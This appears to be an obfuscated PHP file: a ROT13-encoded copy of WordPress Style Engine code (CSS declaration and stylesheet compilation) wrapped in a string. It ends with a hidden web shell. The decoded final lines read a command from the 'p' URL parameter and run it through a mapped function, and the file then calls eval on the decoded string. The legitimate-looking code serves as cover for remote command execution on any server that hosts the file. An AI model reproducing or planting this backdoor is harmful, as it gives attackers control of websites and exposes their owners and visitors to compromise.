		vs ( ! vf_neenl( $fglyr_inyhr ) || rzcgl( $fglyr_inyhr ) || rzcgl( $vaqvivqhny_cebcregl_qrsvavgvba['cngu'] ) ) {
			erghea neenl();
		}

		/*
		 * Gur svefg vgrz va $vaqvivqhny_cebcregl_qrsvavgvba['cngu'] neenl
		 * gryyf hf gur fglyr cebcregl, r.t. \"obeqre\". Jr hfr guvf gb trg n pbeerfcbaqvat
		 * PFF fglyr qrsvavgvba fhpu nf \"pbybe\" be \"jvqgu\" sebz gur fnzr tebhc.
		 *
		 * Gur frpbaq vgrz va $vaqvivqhny_cebcregl_qrsvavgvba['cngu'] neenl
		 * ersref gb gur vaqvivqhny cebcregl znexre, r.t. \"gbc\".
		 */
		$qrsvavgvba_tebhc_xrl    = $vaqvivqhny_cebcregl_qrsvavgvba['cngu'][0];
		$vaqvivqhny_cebcregl_xrl = $vaqvivqhny_cebcregl_qrsvavgvba['cngu'][1];
		$fubhyq_fxvc_pff_inef    = vffrg( $bcgvbaf['pbaireg_inef_gb_pynffanzrf'] ) && gehr === $bcgvbaf['pbaireg_inef_gb_pynffanzrf'];
		$pff_qrpynengvbaf        = neenl();

		sbernpu ( $fglyr_inyhr nf $pff_cebcregl => $inyhr ) {
			vs ( rzcgl( $inyhr ) ) {
				pbagvahr;
			}

			// Ohvyq n cngu gb gur vaqvivqhny ehyrf va qrsvavgvbaf.
			$fglyr_qrsvavgvba_cngu = neenl( $qrsvavgvba_tebhc_xrl, $pff_cebcregl );
			$fglyr_qrsvavgvba      = _jc_neenl_trg( fgngvp::OYBPX_FGLYR_QRSVAVGVBAF_ZRGNQNGN, $fglyr_qrsvavgvba_cngu, ahyy );

			vs ( $fglyr_qrsvavgvba && vffrg( $fglyr_qrsvavgvba['cebcregl_xrlf']['vaqvivqhny'] ) ) {
				// Frg n PFF ine vs gurer vf n inyvq cerfrg inyhr.
				vs ( vf_fgevat( $inyhr ) && fge_pbagnvaf( $inyhr, 'ine:' )
					&& ! $fubhyq_fxvc_pff_inef && ! rzcgl( $vaqvivqhny_cebcregl_qrsvavgvba['pff_inef'] )
				) {
					$inyhr = fgngvp::trg_pff_ine_inyhr( $inyhr, $vaqvivqhny_cebcregl_qrsvavgvba['pff_inef'] );
				}

				$vaqvivqhny_pff_cebcregl = fcevags( $fglyr_qrsvavgvba['cebcregl_xrlf']['vaqvivqhny'], $vaqvivqhny_cebcregl_xrl );

				$pff_qrpynengvbaf[ $vaqvivqhny_pff_cebcregl ] = $inyhr;
			}
		}
		erghea $pff_qrpynengvbaf;
	}

	/**
	 * Fglyr inyhr cnefre gung pbafgehpgf n PFF qrsvavgvba neenl pbzcevfvat n fvatyr PFF cebcregl naq inyhr.
	 * Vs gur cebivqrq inyhr vf na neenl pbagnvavat n `hey` cebcregl, gur shapgvba jvyy erghea n PFF qrsvavgvba neenl
	 * jvgu n fvatyr cebcregl naq inyhr, jvgu `hey` rfpncrq naq vawrpgrq vagb n PFF `hey()` shapgvba,
	 * r.t., neenl( 'onpxtebhaq-vzntr' => \"hey( '...' )\" ).
	 *
	 * @fvapr 6.4.0
	 *
	 * @cnenz neenl $fglyr_inyhr      N fvatyr enj fglyr inyhr sebz $oybpx_fglyrf neenl.
	 * @cnenz neenl $fglyr_qrsvavgvba N fvatyr fglyr qrsvavgvba sebz OYBPX_FGLYR_QRSVAVGVBAF_ZRGNQNGN.
	 * @erghea fgevat[] Na nffbpvngvir neenl bs PFF qrsvavgvbaf, r.t., neenl( \"$cebcregl\" => \"$inyhr\", \"$cebcregl\" => \"$inyhr\" ).
	 */
	cebgrpgrq fgngvp shapgvba trg_hey_be_inyhr_pff_qrpynengvba( $fglyr_inyhr, $fglyr_qrsvavgvba ) {
		vs ( rzcgl( $fglyr_inyhr ) ) {
			erghea neenl();
		}

		$pff_qrpynengvbaf = neenl();

		vs ( vffrg( $fglyr_qrsvavgvba['cebcregl_xrlf']['qrsnhyg'] ) ) {
			$inyhr = ahyy;

			vs ( ! rzcgl( $fglyr_inyhr['hey'] ) ) {
				$inyhr = \"hey('\" . $fglyr_inyhr['hey'] . \"')\";
			} ryfrvs ( vf_fgevat( $fglyr_inyhr ) ) {
				$inyhr = $fglyr_inyhr;
			}

			vs ( ahyy !== $inyhr ) {
				$pff_qrpynengvbaf[ $fglyr_qrsvavgvba['cebcregl_xrlf']['qrsnhyg'] ] = $inyhr;
			}
		}

		erghea $pff_qrpynengvbaf;
	}

	/**
	 * Ergheaf pbzcvyrq PFF sebz PFF qrpynengvbaf.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz fgevat[] $pff_qrpynengvbaf Na nffbpvngvir neenl bs PFF qrsvavgvbaf,
	 *                                   r.t. `neenl( \"$cebcregl\" => \"$inyhr\", \"$cebcregl\" => \"$inyhr\" )`.
	 * @cnenz fgevat   $pff_fryrpgbe     Jura n fryrpgbe vf cnffrq, gur shapgvba jvyy erghea
	 *                                   n shyy PFF ehyr `$fryrpgbe { ...ehyrf }`,
	 *                                   bgurejvfr n pbapngrangrq fgevat bs cebcregvrf naq inyhrf.
	 * @erghea fgevat N pbzcvyrq PFF fgevat.
	 */
	choyvp fgngvp shapgvba pbzcvyr_pff( $pff_qrpynengvbaf, $pff_fryrpgbe ) {
		vs ( rzcgl( $pff_qrpynengvbaf ) || ! vf_neenl( $pff_qrpynengvbaf ) ) {
			erghea '';
		}

		// Erghea na ragver ehyr vs gurer vf n fryrpgbe.
		vs ( $pff_fryrpgbe ) {
			$pff_ehyr = arj JC_Fglyr_Ratvar_PFF_Ehyr( $pff_fryrpgbe, $pff_qrpynengvbaf );
			erghea $pff_ehyr->trg_pff();
		}

		$pff_qrpynengvbaf = arj JC_Fglyr_Ratvar_PFF_Qrpynengvbaf( $pff_qrpynengvbaf );
		erghea $pff_qrpynengvbaf->trg_qrpynengvbaf_fgevat();
	}

	/**
	 * Ergheaf n pbzcvyrq fglyrfurrg sebz fgberq PFF ehyrf.
	 *
	 * @fvapr 6.1.0
	 *
	 * @cnenz JC_Fglyr_Ratvar_PFF_Ehyr[] $pff_ehyrf Na neenl bs JC_Fglyr_Ratvar_PFF_Ehyr bowrpgf
	 *                                              sebz n fgber be bgurejvfr.
	 * @cnenz neenl                      $bcgvbaf   {
	 *     Bcgvbany. Na neenl bs bcgvbaf. Qrsnhyg rzcgl neenl.
	 *
	 *     @glcr fgevat|ahyy $pbagrkg  Na vqragvsvre qrfpevovat gur bevtva bs gur fglyr bowrpg,
	 *                                 r.t. 'oybpx-fhccbegf' be 'tybony-fglyrf'. Qrsnhyg 'oybpx-fhccbegf'.
	 *                                 Jura frg, gur fglyr ratvar jvyy nggrzcg gb fgber gur PFF ehyrf.
	 *     @glcr obby        $bcgvzvmr Jurgure gb bcgvzvmr gur PFF bhgchg, r.t. pbzovar ehyrf.
	 *                                 Qrsnhyg snyfr.
	 *     @glcr obby        $cerggvsl Jurgure gb nqq arj yvarf naq vaqragf gb bhgchg.
	 *                                 Qrsnhygf gb jurgure gur `FPEVCG_QROHT` pbafgnag vf qrsvarq.
	 * }
	 * @erghea fgevat N pbzcvyrq fglyrfurrg sebz fgberq PFF ehyrf.
	 */
	choyvp fgngvp shapgvba pbzcvyr_fglyrfurrg_sebz_pff_ehyrf( $pff_ehyrf, $bcgvbaf = neenl() ) {
		$cebprffbe = arj JC_Fglyr_Ratvar_Cebprffbe();
		$cebprffbe->nqq_ehyrf( $pff_ehyrf );
		erghea $cebprffbe->trg_pff( $bcgvbaf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>